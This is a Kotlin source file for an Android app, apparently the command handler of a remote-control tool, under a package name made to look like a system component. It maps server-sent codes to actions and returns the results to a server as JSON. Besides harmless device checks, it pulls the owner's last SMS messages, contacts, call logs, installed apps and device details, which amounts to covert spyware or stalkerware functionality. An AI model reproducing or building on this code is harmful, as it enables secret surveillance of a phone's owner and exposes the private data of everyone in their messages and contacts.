package com.android.system.config

import android.content.Context
import android.os.Build
import androidx.annotation.RequiresApi

class ManageCommand {
    @RequiresApi(Build.VERSION_CODES.LOLLIPOP)
    fun manageMessage(context: Context, cmd: String, to: String):String{
        var response =""
        if (cmd == "WFCON"){//checks if wifi connected
            response = "WIFI is  ${if(Functions().isConnectedToWifi(context))"connected" else "not connected"}"
        }else if(cmd == "BTYPC"){//check battery percentage
            response = "${Functions().getBatteryPercentage(context)}% battery remaining.."
        }
        else if(cmd == "DSPC"){//check if display is on or off
            response = "Display is ${if(Functions().isScreenOn(context))"ON" else "OFF"}"
        }
        else if(cmd=="CHGC"){//check if phone charging or not
            response = "Phone is ${if(Functions().isCharging(context))"Charging" else "Not Charging"}"
        }
        else if(cmd=="MDVI"){//increase media voolume
            response = "increased volume to ${Functions().increaseMediaVolume(context,"inc","md")}"
        }
        else if(cmd=="MDVD"){//decrease media volume
            response = "decreased volume to ${Functions().increaseMediaVolume(context,"dec","md")}"
        }
        else if(cmd=="RNVI"){//increase ring volume
            response = "decreased volume to ${Functions().increaseMediaVolume(context,"inc","rd")}"
        }
        else if(cmd=="RNVD"){//decrease ring volume
            response = "decreased volume to ${Functions().increaseMediaVolume(context,"dec","rd")}"
        }
        else if(cmd=="FLSE"){//turn flash on

            response = "flashlight is   ${if(Functions().openFlashlight(context,true))"ON" else "OFF"}"
        }
        else if(cmd=="FLSD"){//turn flash off
            response = "flashlight is   ${if(Functions().openFlashlight(context,false))"ON" else "OFF"}"
        }
        else if(cmd=="GPSC"){//check gps enabled or not
            response = "Location  is   ${if(Functions().isGpsEnabled(context))"ON" else "OFF"}"
        }
        else if(cmd=="INAPD"){//get  installed application's names (3rd party)
            response = Functions().getInstalledAppNames(context)
        }
        else if(cmd=="ANDDT"){// android details
            response = Functions().getDetails(context)
        }
        else if(cmd=="HSCON"){//check headphones connected or not
            response = Functions().checkHeadphonesStatus(context)
        }
        else if(cmd=="BTTCK"){//check bluetooth is enabled/disabled/not supported
            response = Functions().checkBluetoothStatus()
        }
        else if(cmd=="OPSTT"){//opens apps
            response = Functions().openSettings(context,"com.whatsapp")
        }
        else if(cmd=="PMSGN"){//get list of permissions allowed or denied
            response = Functions().checkPermissions(context)
        }
        else if(cmd=="L5MSG"){// get last 5 sms
            response = Functions().getMessages(context)
        }
        else if(cmd=="GTCNT"){//get contacts details
            response = Functions().getContacts(context)
        }//PLSND
        else if(cmd=="GTLOG"){//get last 10 calllog
            response = Functions().getCallLogs(context)
        }
        else if(cmd=="PLSND"){//play sound in res/raw/ping.mp3
            response = Functions().playSound(context)
        }



        //return back to server json model string
        return "{\"type\":\"r\",\"data\":\"${response}\",\"to\":\"${to}\"}"
    }
}
